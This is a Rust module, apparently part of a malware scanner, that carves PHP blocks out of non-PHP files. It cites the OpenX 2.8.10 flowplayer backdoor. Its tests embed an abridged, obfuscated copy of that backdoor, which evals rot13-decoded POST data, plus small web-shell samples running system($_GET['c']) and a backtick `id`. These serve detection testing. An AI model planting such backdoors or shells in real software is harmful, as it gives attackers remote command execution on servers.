//! Carve the PHP blocks a non-PHP file carries.
//!
//! PHP's `include` runs every `<?php … ?>` block in the raw bytes of the file
//! it includes, whatever that file's extension and whatever the host language
//! makes of those bytes — a string, a comment, code. OpenX 2.8.10 hid
//! `eval($_POST[…])` in a string literal of its bundled flowplayer, valid
//! JavaScript to every JavaScript reader, and had its PHP `require_once` the
//! file. Each block is carved as PHP reads it, so PHP's own traits judge what
//! it does: a highlighter's `<?php echo 1; ?>` sample reads as the echo it is.
//! An escaped tag, as in `/<\?php/`, is not a tag to PHP and is not carved.

/// The most blocks carved from one file.
const MAX_BLOCKS: usize = 8;

/// Each PHP block in `source`, by byte offset: from its open tag through its
/// close tag, or to the end of the file when it has none, as PHP reads it.
pub(crate) fn extract(source: &str) -> Vec<(u64, &str)> {
    let mut out = Vec::new();
    let mut from = 0;
    while out.len() < MAX_BLOCKS {
        let Some(start) = source.get(from..).and_then(open_tag).map(|i| from + i) else {
            break;
        };
        // Both tags are ASCII, so every offset here is a char boundary.
        let body = start + 2;
        let end = source[body..]
            .find("?>")
            .map_or(source.len(), |i| body + i + 2);
        out.push((start as u64, &source[start..end]));
        from = end;
    }
    out
}

/// The offset of the first tag PHP opens a block at: `<?php` in any case
/// followed by whitespace, or the echo tag `<?=`.
fn open_tag(text: &str) -> Option<usize> {
    let bytes = text.as_bytes();
    text.match_indices("<?").map(|(i, _)| i).find(|&i| {
        let rest = &bytes[i + 2..];
        rest.first() == Some(&b'=')
            || (rest.len() > 3
                && rest[..3].eq_ignore_ascii_case(b"php")
                && rest[3].is_ascii_whitespace())
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn blocks(s: &str) -> Vec<&str> {
        extract(s).into_iter().map(|(_, block)| block).collect()
    }

    #[test]
    fn carves_the_openx_flowplayer_block_from_a_string_literal() {
        // OpenX 2.8.10, flowplayer-3.1.1.min.js, abridged: a string
        // assignment wraps the block, so the JavaScript still parses, and the
        // block decodes its callee names from comment-split literals.
        let block = "<?php /*if(e){jQuery.tools=jQuery.tools||{};*/$j='ex'./**/'plode'; \
                     $_=$j(',','strr'./*o.returnValue=false;*/'ev,str_r'.'ot13,vas'.'tPlayer');\
                     eval/*for(var p in q)*/($_[1]($_[0]($_POST[$_[2]]))); ?>";
        let js = format!(
            "m(document.getElementsByTagName(p),function(){{undefinedType=\"jQuery.fn.flashembed=function(k,j){{l=flashembed(this,k,j)}}{block}\";if(o){{r.push(this)}}}});"
        );
        let found = extract(&js);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].1, block);
        assert_eq!(Some(found[0].0), js.find("<?php").map(|i| i as u64));
    }

    #[test]
    fn reads_tags_as_php_does() {
        // Case-insensitive, whitespace required after the name, the echo tag,
        // and an unclosed block running to the end of the file.
        assert_eq!(
            blocks("a();\n<?PHP\nsystem($_GET['c']);"),
            ["<?PHP\nsystem($_GET['c']);"]
        );
        assert_eq!(blocks("a('<?= `id` ?>');"), ["<?= `id` ?>"]);
        assert_eq!(
            blocks("/* <?php x(); ?> */ b('<?php y(); ?>');"),
            ["<?php x(); ?>", "<?php y(); ?>"]
        );
        // Not tags to PHP: no whitespace after the name, or escaped.
        assert!(extract("a('<?phpinfo ?>');").is_empty());
        assert!(extract("const open = /<\\?php\\s/;").is_empty());
        assert!(extract("const xml = '<?xml version=\"1.0\"?>';").is_empty());
    }

    #[test]
    fn stops_at_the_block_cap() {
        let many = "<?php x(); ?>".repeat(MAX_BLOCKS + 3);
        assert_eq!(extract(&many).len(), MAX_BLOCKS);
    }
}
